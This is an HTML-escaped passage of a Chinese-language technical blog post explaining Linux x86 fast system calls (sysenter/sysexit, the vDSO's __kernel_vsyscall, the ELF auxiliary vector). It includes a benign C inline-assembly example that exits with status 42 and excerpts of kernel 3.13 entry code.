&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中&lt;code&gt;INTERRUPT_RETURN&lt;/code&gt;在 &lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L132&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/include/asm/irqflags.h&lt;/code&gt;&lt;/a&gt;被定义为&lt;code&gt;iretq&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;到目前为止，你已经知道传统系统调用是如何工作的了。&lt;/p&gt;
&lt;h2 id=&quot;快速系统调用&quot;&gt;&lt;a href=&quot;#快速系统调用&quot; class=&quot;headerlink&quot; title=&quot;快速系统调用&quot;&gt;&lt;/a&gt;快速系统调用&lt;/h2&gt;&lt;p&gt;传统的系统调用过程看起来似乎很合理，但最新的方法是不需要软件中断来触发系统调用的，而且比使用软件中断更快。&lt;/p&gt;
&lt;p&gt;这两种快速的方法都分别包含两条指令。一条指令用来进入内核，另一条则用来退出内核。两种方法都在Intel CPU的文档中定义为”快速系统调用”.&lt;/p&gt;
&lt;p&gt;然而，Intel和AMD在具体实现的时候，针对CPU分别运行在32位和64位时该采用哪种方法才有更效的问题上产生了分歧。&lt;/p&gt;
&lt;p&gt;为了在Intel和AMD处理器中最大化兼容性：&lt;/p&gt;
&lt;p&gt;   32位系统中使用：&lt;code&gt;sysenter&lt;/code&gt;和&lt;code&gt;sysexit&lt;/code&gt;&lt;br&gt;   64位系统中使用：&lt;code&gt;syscall&lt;/code&gt;和&lt;code&gt;sysret&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;32位快速系统调用&quot;&gt;&lt;a href=&quot;#32位快速系统调用&quot; class=&quot;headerlink&quot; title=&quot;32位快速系统调用&quot;&gt;&lt;/a&gt;32位快速系统调用&lt;/h3&gt;&lt;h4 id=&quot;sysenter-sysexit&quot;&gt;&lt;a href=&quot;#sysenter-sysexit&quot; class=&quot;headerlink&quot; title=&quot;sysenter/sysexit&quot;&gt;&lt;/a&gt;&lt;code&gt;sysenter&lt;/code&gt;/&lt;code&gt;sysexit&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;  用&lt;code&gt;sysenter&lt;/code&gt;触发系统调用比传统中断方法要复杂一些，其涉及到用户程序(通过glibc）与内核之间更多的协调问题。&lt;/p&gt;
&lt;p&gt;  我们逐步来了解这些细节。首先来看看Intel指令集参考手册中是如何描述&lt;code&gt;sysenter&lt;/code&gt;以及如何使用它的。&lt;/p&gt;
&lt;p&gt;  看下面：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  Prior to executing the SYSENTER instruction, software must specify the privilege level 0 code segment and code entry point, and the privilege level 0 stack segment and stack pointer by writing values to the following MSRs:

• IA32_SYSENTER_CS (MSR address 174H) — The lower 16 bits of this MSR are the segment selector for the privilege level 0 code segment. This value is also used to determine the segment selector of the privilege level 0 stack segment (see the Operation section). This value cannot indicate a null selector.

• IA32_SYSENTER_EIP (MSR address 176H) — The value of this MSR is loaded into RIP (thus, this value references the first instruction of the selected operating procedure or routine). In protected mode, only bits 31:0 are loaded.

• IA32_SYSENTER_ESP (MSR address 175H) — The value of this MSR is loaded into RSP (thus, this value contains the stack pointer for the privilege level 0 stack). This value cannot represent a non-canonical address. In protected mode, only bits 31:0 are loaded.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;换句话说：为了让内核接收到&lt;code&gt;sysenter&lt;/code&gt;触发的系统调用，内核必须设置3个特殊模块寄存器（MSRs). 其中最重要的是 &lt;code&gt;IA32_SYSENTER_EIP&lt;/code&gt;(地址是0x176). 该MSR代表的是用户程序在执行 &lt;code&gt;sysenter&lt;/code&gt;指令时，内核将要执行的函数地址。&lt;/p&gt;
&lt;p&gt;我们可以在内核代码&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso32-setup.c#L240&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/vdso/vdso32-setup.c&lt;/code&gt;&lt;/a&gt;中找到写MSR的相关代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void enable_sep_cpu(void)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{&lt;br&gt;        /&lt;em&gt; … other code … &lt;/em&gt;/&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wrmsr(MSR_IA32_SYSENTER_EIP, (unsigned long) ia32_sysenter_target, 0);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;MSR_IA32_SYSENTER_EIP&lt;/code&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/uapi/asm/msr-index.h#L54&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/include/uapi/asm/msr-index.h&lt;/code&gt;&lt;/a&gt;中定义为 &lt;code&gt;0x00000176&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;类似传统软件中断型的系统调用, 使用&lt;code&gt;sysenter&lt;/code&gt;触发系统调用时也定义了一些规范。&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L99-L117&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/ia32entry.S&lt;/code&gt;&lt;/a&gt;的注释中可以找到相关内容:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* 32bit SYSENTER instruction entry.
 *
 * Arguments:
 * %eax System call number.
 * %ebx Arg1
 * %ecx Arg2
 * %edx Arg3
 * %esi Arg4
 * %edi Arg5
 * %ebp user stack
 * 0(%ebp) Arg6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;回想一下，传统的系统调用方法包括返回到用户程序的机制：&lt;code&gt;iret&lt;/code&gt;指令。&lt;/p&gt;
&lt;p&gt;要理解让&lt;code&gt;sysenter&lt;/code&gt;正确执行的逻辑不太简单，因为不像软件中断,&lt;code&gt;sysenter&lt;/code&gt;并不存储返回地址。&lt;/p&gt;
&lt;p&gt;实际上，在执行&lt;code&gt;sysenter&lt;/code&gt;指令之前，内核要做的一些记录工作都是会随着时间而变化的(如果已经改变了，你就会看到下文中将要描述的bugs了)&lt;/p&gt;
&lt;p&gt;为了兼容未来特性的变化，用户程序使用内核中的函数&lt;br&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;。当调用该函数的进程执行时，会被映射到每个用户进程空间中去。&lt;/p&gt;
&lt;p&gt;这听起来有点诡异。它是内核中的代码，却在用户层执行。&lt;/p&gt;
&lt;p&gt;实际上，&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;是vDSO(virtual Dynamic Shared Object)的一部分，而vDSO允许程序在用户层中执行内核代码。&lt;/p&gt;
&lt;p&gt;后文中会具体介绍什么是vDSO，vDSO做了什么以及工作原理是什么。&lt;/p&gt;
&lt;p&gt;我们先来了解&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;的一些细节。&lt;/p&gt;
&lt;h4 id=&quot;kernel-vsyscall内幕&quot;&gt;&lt;a href=&quot;#kernel-vsyscall内幕&quot; class=&quot;headerlink&quot; title=&quot;_ _kernel_vsyscall内幕&quot;&gt;&lt;/a&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;内幕&lt;/h4&gt;&lt;p&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数封装了&lt;code&gt;sysenter&lt;/code&gt;调用的规范，定义在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso32/sysenter.S#L31-L40&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/vdso/vdso32/sysenter.S&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__kernel_vsyscall:
.LSTART_vsyscall:
    push %ecx
.Lpush_ecx:
    push %edx
.Lpush_edx:
    push %ebp
.Lenter_kernel:
    movl %esp,%ebp
    sysenter
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;既然是vDSO(也被称为共享库)的一部分，那用户程序是如何在运行时定位该函数地址的呢？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数的地址被写入到 &lt;a href=&quot;https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ELF 辅助向量&lt;/a&gt;, 用户程序以及库函数(主要指glibc)可以在这里找到其地址并使用。&lt;/p&gt;
&lt;p&gt;以下方法可用来查找ELF辅助向量：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用&lt;a href=&quot;http://man7.org/linux/man-pages/man3/getauxval.3.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;getauxval&lt;/code&gt;&lt;/a&gt;函数，带有&lt;code&gt;AT_SYSINFO&lt;/code&gt;参数.&lt;/li&gt;
&lt;li&gt;迭代搜索环境变量,然后从内存中解析这些变量.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;第一种方法较为简单，但glibc 2.16前的版本不支持。 下文例子中介绍的代码中实现的是第二种方法。&lt;/p&gt;
&lt;p&gt;从有关&lt;code&gt;__kernel_vsyscall&lt;/code&gt;的代码中可以看出，在执行&lt;code&gt;sysenter&lt;/code&gt;指令之前&lt;code&gt;__kernel_vsyscall&lt;/code&gt;会做一些记录工作。&lt;/p&gt;
&lt;p&gt;因此，我们需要做的就是手动利用&lt;code&gt;sysenter&lt;/code&gt;进入到内核中：&lt;/p&gt;
&lt;p&gt;  . 在ELF辅助向量中找到&lt;code&gt;AT_SYSINFO&lt;/code&gt;,也就是&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;被写入的地址&lt;br&gt;  . 像传统系统调用一样，将系统调用号和参数写入寄存器中&lt;br&gt;  . 调用&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数&lt;/p&gt;
&lt;p&gt;你可能从来没写过属于你自己的&lt;code&gt;sysenter&lt;/code&gt;封装函数，那是因为内核利用&lt;code&gt;sysenter&lt;/code&gt;进入和退出系统调用的规范是会变化的，到那时候你的代码就会崩溃了。&lt;/p&gt;
&lt;p&gt;在开始用&lt;code&gt;sysenter&lt;/code&gt;触发系统调用前，你都要调用&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数。&lt;/p&gt;
&lt;p&gt;那么，让我们开始吧。&lt;/p&gt;
&lt;h4 id=&quot;自己写汇编使用sysenter&quot;&gt;&lt;a href=&quot;#自己写汇编使用sysenter&quot; class=&quot;headerlink&quot; title=&quot;自己写汇编使用sysenter&quot;&gt;&lt;/a&gt;自己写汇编使用sysenter&lt;/h4&gt;&lt;p&gt;继续利用前面传统系统调用的例子，我们调用&lt;code&gt;exit&lt;/code&gt;，退出状态是42.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;exit&lt;/code&gt;的系统调用号是1. 根据前文描述，我们只需要将系统调用号写进&lt;code&gt;eax&lt;/code&gt;寄存器中，并把第一个参数(退出状态)写到&lt;code&gt;ebx&lt;/code&gt;寄存器中。&lt;/p&gt;
&lt;p&gt;（实际上这个例子可以简化一些，但我认为多用一些文字描述会更有趣，让那些之前没见过GCC内联汇编代码的人也可以用下面的例子作为参考）&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;elf.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* argv[], &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* envp[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; syscall_nr = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; exit_status = &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Elf32_auxv_t *auxv;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/* auxilliary vectors are located after the end of the environment&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * variables&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * check this helpful diagram: https://static.lwn.net/images/2012/auxvec.png&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(*envp++ != &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/* envp is now pointed at the auxilliary vectors, since we&#39;ve iterated&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * through the environment variables.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (auxv = (Elf32_auxv_t *)envp; auxv-&amp;gt;a_type != AT_NULL; auxv++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;( auxv-&amp;gt;a_type == AT_SYSINFO) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/* &lt;span class=&quot;doctag&quot;&gt;NOTE:&lt;/span&gt; in glibc 2.16 and higher you can replace the above code with&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * a call to getauxval(3):  getauxval(AT_SYSINFO)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;movl %0,  %%eax    \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;movl %1, %%ebx    \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;call *%2          \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      : &lt;span class=&quot;comment&quot;&gt;/* output parameters, we aren&#39;t outputting anything, no none */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* (none) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      : &lt;span class=&quot;comment&quot;&gt;/* input parameters mapped to %0 and %1, repsectively */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (syscall_nr), &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (exit_status), &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (auxv-&amp;gt;a_un.a_val)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      : &lt;span class=&quot;comment&quot;&gt;/* registers that we are &quot;clobbering&quot;, unneeded since we are calling exit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;eax&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;ebx&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来，编译，执行，然后检查退出状态:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gcc -m32 -o test test.c
$ ./test
$ echo $?
42
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功了! 我们利用 &lt;code&gt;sysenter&lt;/code&gt;触发了&lt;code&gt;exit&lt;/code&gt;系统调用，而不需要引发软件中断。&lt;/p&gt;
&lt;h4 id=&quot;内核层面：sysenter入口&quot;&gt;&lt;a href=&quot;#内核层面：sysenter入口&quot; class=&quot;headerlink&quot; title=&quot;内核层面：sysenter入口&quot;&gt;&lt;/a&gt;内核层面：&lt;code&gt;sysenter&lt;/code&gt;入口&lt;/h4&gt;&lt;p&gt;目前我们已经知道用户程序如何通过&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数利用&lt;code&gt;sysenter&lt;/code&gt;触发系统调用，下面来看看内核如何利用系统调用号来执行系统调用中的代码。&lt;/p&gt;
&lt;p&gt;回想前面的章节，内核调用&lt;code&gt;ia32_sysenter_target&lt;/code&gt;来注册系统调用处理函数。&lt;/p&gt;
&lt;p&gt;此函数在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L162-L163&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/ia32entry.S&lt;/code&gt;&lt;/a&gt;中以汇编代码实现。我们来看看&lt;code&gt;eax&lt;/code&gt;寄存器中的值是在哪里被用来执行系统调用的:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sysenter_dispatch:
    call    *ia32_sys_call_table(,%rax,8)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这段代码和前文传统系统调用模式的代码很类似：名为&lt;code&gt;ia32_sys_call_table&lt;/code&gt;的表存储着系统调用号。&lt;/p&gt;
&lt;p&gt;在所有必要的记录工作完成后，传统系统调用模型以及&lt;code&gt;sysenter&lt;/code&gt;系统调用模型采用相同的机制和系统调用表来分配系统调用。&lt;/p&gt;
&lt;p&gt;参照 &lt;code&gt;int $0x80&lt;/code&gt;（内核层面：int $0x80入口这一章节)，可以了解到&lt;code&gt;ia32_sys_call_table&lt;/code&gt; 是如何定义和构造的。&lt;/p&gt;
&lt;p&gt;以上内容就是如何通过&lt;code&gt;sysenter&lt;/code&gt;系统调用进入内核的全部过程。&lt;/p&gt;
&lt;h4 id=&quot;sysexit-从sysenter中返回&quot;&gt;&lt;a href=&quot;#sysexit-从sysenter中返回&quot; class=&quot;headerlink&quot; title=&quot;sysexit: 从sysenter中返回&quot;&gt;&lt;/a&gt;sysexit: 从sysenter中返回&lt;/h4&gt;&lt;p&gt;内核利用&lt;code&gt;sysexit&lt;/code&gt;指令将执行环境恢复到用户程序。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sysexit&lt;/code&gt;指令的使用不像&lt;code&gt;iret&lt;/code&gt;那么直接。调用者需要将返回地址写入&lt;code&gt;rdx&lt;/code&gt;寄存器中，并将栈指针写入&lt;code&gt;rcx&lt;/code&gt;寄存器。&lt;/p&gt;
&lt;p&gt;这就意味着你的代码中需要计算执行环境要返回的地址，保存地址值，并在调用&lt;code&gt;sysexit&lt;/code&gt;前能恢复。&lt;/p&gt;
&lt;p&gt;可以在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L169-L185&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/ia32entry.S&lt;/code&gt;&lt;/a&gt; 找到相关代码:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sysexit_from_sys_call:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        andl    $~TS_COMPAT,TI_status+THREAD_INFO(%rsp,RIP-ARGOFFSET)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* clear IF, that popfq doesn&#39;t enable interrupts early */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        andl  $~&lt;span class=&quot;number&quot;&gt;0x200&lt;/span&gt;,EFLAGS-R11(%rsp)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movl    RIP-R11(%rsp),%edx              &lt;span class=&quot;comment&quot;&gt;/* User %eip */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        CFI_REGISTER rip,rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        RESTORE_ARGS &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xorq    %r8,%r8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xorq    %r9,%r9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xorq    %r10,%r10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xorq    %r11,%r11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        popfq_cfi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/*CFI_RESTORE rflags*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 